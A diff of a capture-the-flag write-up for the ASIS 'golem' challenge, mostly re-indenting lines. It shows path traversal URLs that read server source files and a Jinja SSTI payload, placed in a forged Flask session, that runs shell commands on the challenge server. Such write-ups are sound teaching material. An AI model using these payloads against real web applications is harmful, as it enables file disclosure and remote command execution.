@@ -6,33 +6,31 @@
 
 =>
 
-location /static/ {
+    location /static/ {
 
-    root /opt/serverPython/golem;
+        root /opt/serverPython/golem;
     
-    expires 30d;
+        expires 30d;
     
-    add_header Pragma public;
+        add_header Pragma public;
     
-    add_header Cache-Control &#34;public&#34;;
+        add_header Cache-Control &#34;public&#34;;
 
-}
-
+    }
 
 
 `https://golem.asisctf.com/article?name=../../../../../opt/serverPython/golem/server.py`
 
 =>
 
-execfile('flag.py')
+    execfile('flag.py')
+    execfile('key.py')
 
-execfile('key.py')
+    FLAG = flag
 
-FLAG = flag
+    app.secret\_key = key
 
-app.secret\_key = key
-
-...
+    ...
 
 
 https://golem.asisctf.com/article?name=../../../../../opt/serverPython/golem/secret.py
@@ -44,7 +42,7 @@ https://golem.asisctf.com/article?name=../../../../../opt/serverPython/golem/sec
 
 ## SSTI
 
-use the secret key to let session['golem'] = {{ config[\'RUNCMD\'](\'grep "ASIS" flag.py\',shell=True) }}
+use the secret key to let session['golem'] = `{{ config[\'RUNCMD\'](\'grep "ASIS" flag.py\',shell=True) }}`
 
 =>
 
